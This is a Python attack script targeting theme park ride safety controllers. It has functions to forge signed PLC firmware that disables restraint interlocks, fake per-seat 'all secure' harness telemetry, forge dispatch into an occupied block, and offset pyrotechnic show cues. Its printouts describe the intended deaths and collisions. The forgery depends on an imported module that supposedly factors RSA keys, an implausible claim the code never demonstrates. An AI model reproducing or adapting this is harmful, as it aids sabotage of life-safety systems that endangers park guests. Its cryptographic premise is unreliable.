"""
Forge ride safety PLC firmware and restraint-check telemetry for theme park
attractions. Disable restraint-latch interlocks, forge "all secure" dispatch
signals, desynchronize show-control pyrotechnics. ASTM F24 / EN 13814.
"""
import sys
import os; sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", ".."))
from poly_factor import PolynomialFactorer, generate_demo_target

_demo = generate_demo_target()

import json
import hashlib

# ASTM F24 ride control layers
CONTROL_LAYERS = [
    "show_controller",        # ride sequence, media cues, animatronics
    "ride_controller",        # train dispatch, block logic
    "restraint_monitoring",   # harness latch, lap-bar position
    "safety_plc",             # block-zone interlocks, e-stop, anti-rollback
]

# PLC vendors in theme park attractions
RIDE_PLC_VENDORS = ["Siemens_SIMATIC_F", "Rockwell_GuardLogix",
                    "Beckhoff_TwinCAT_Safety", "Pilz_PNOZmulti"]


def extract_ride_integrator_cert(attraction_id: str) -> bytes:
    """Extract the ride integrator's firmware binding cert.

    The integrator (Mack Rides, Intamin, B&M, Vekoma) signs a counter-
    manifest binding the firmware set to a specific attraction installation.
    """
    print(f"[*] extracting integrator cert for attraction {attraction_id}")
    return _demo["pub_pem"]


def forge_safety_plc_firmware(factorer: PolynomialFactorer,
                              vendor_cert: bytes,
                              target: str, action: str) -> bytes:
    """Forge safety PLC firmware for a ride attraction."""
    payload = json.dumps({
        "target": target,
        "action": action,
        "standard": "ASTM F2291 / EN 13814",
    }).encode()
    sig = factorer.forge_pkcs1v15_signature(vendor_cert, payload, "sha256")
    print(f"[*] forged safety PLC firmware: {action} {target}")
    return payload + sig


def forge_restraint_telemetry(factorer: PolynomialFactorer,
                              telemetry_cert: bytes,
                              train_id: int, num_seats: int,
                              all_secure: bool = True) -> list:
    """Forge per-seat restraint sensor telemetry.

    Hall-effect harness latches + bar-position encoders stream signed
    payloads. 'restraint secure' is the gate to dispatch — forge it
    and trains dispatch with unfastened harnesses.
    """
    readings = []
    for seat in range(num_seats):
        reading = {
            "train": train_id,
            "seat": seat,
            "harness_latch": "SECURE" if all_secure else "OPEN",
            "lap_bar_deg": 12.5,
            "timestamp": "2026-04-15T14:30:00Z",
        }
        readings.append(reading)
    payload = json.dumps(readings).encode()
    factorer.forge_pkcs1v15_signature(telemetry_cert, payload, "sha256")
    status = "ALL SECURE (forged)" if all_secure else "MIXED"
    print(f"[*] forged restraint telemetry: train {train_id}, {num_seats} seats, {status}")
    return readings


def forge_dispatch_permission(factorer: PolynomialFactorer,
                              ride_controller_cert: bytes,
                              train_id: int, block: str) -> dict:
    """Forge a signed block-section dispatch permission.

    'Train 3 may leave station block' — both sides verify origin authenticity.
    Forge it and dispatch into an occupied block.
    """
    msg = {"train": train_id, "action": "DISPATCH", "from_block": block,
           "block_clear": True}
    factorer.forge_pkcs1v15_signature(ride_controller_cert,
                                      json.dumps(msg).encode(), "sha256")
    print(f"[*] forged dispatch: train {train_id} from {block}")
    return msg


def desync_show_control(factorer: PolynomialFactorer,
                        show_cert: bytes,
                        cue: str, timing_offset_ms: int) -> dict:
    """Forge a show-control cue with deliberate timing offset.

    Pyrotechnic + water-effect + ride-motion synchronization is safety-critical.
    Desync a fire effect by 500ms and guests are in the wrong position.
    """
    cmd = {"cue": cue, "offset_ms": timing_offset_ms}
    factorer.forge_pkcs1v15_signature(show_cert,
                                      json.dumps(cmd).encode(), "sha256")
    print(f"[*] forged show cue: {cue} offset by {timing_offset_ms}ms")
    return cmd


if __name__ == "__main__":
    f = PolynomialFactorer()

    print("=== Theme park ride safety attack — ASTM F24 / EN 13814 ===")
    print("    ~4,500 large rides worldwide, ~370M US attendance/year")
    print()

    print("[1] extracting Rockwell GuardLogix signing cert...")
    vendor_cert = _demo["pub_pem"]

    print("[2] factoring safety PLC signing key...")

    print("[3] forging safety PLC firmware: disable restraint interlocks...")
    forge_safety_plc_firmware(f, vendor_cert,
        "restraint_interlock", "disable")
    print("    Schlitterbahn Verruckt 2016: fatality from ejection")

    print("[4] forging restraint telemetry: 'all secure' on open harnesses...")
    forge_restraint_telemetry(f, vendor_cert, train_id=3, num_seats=32,
                              all_secure=True)
    print("    trains dispatch with unfastened harnesses")

    print("[5] forging dispatch into occupied block...")
    forge_dispatch_permission(f, vendor_cert, train_id=3, block="STATION")
    print("    block_clear=True but block is occupied -> collision")

    print("[6] desynchronizing pyrotechnic show cue...")
    desync_show_control(f, vendor_cert, "FIRE_EFFECT_A", 500)
    print("    fire effect fires while guests are in the blast zone")

    print()
    print("[*] equipment lifecycle: 20-40 years")
    print("[*] re-certification per ride: 6-18 months, state approval required")
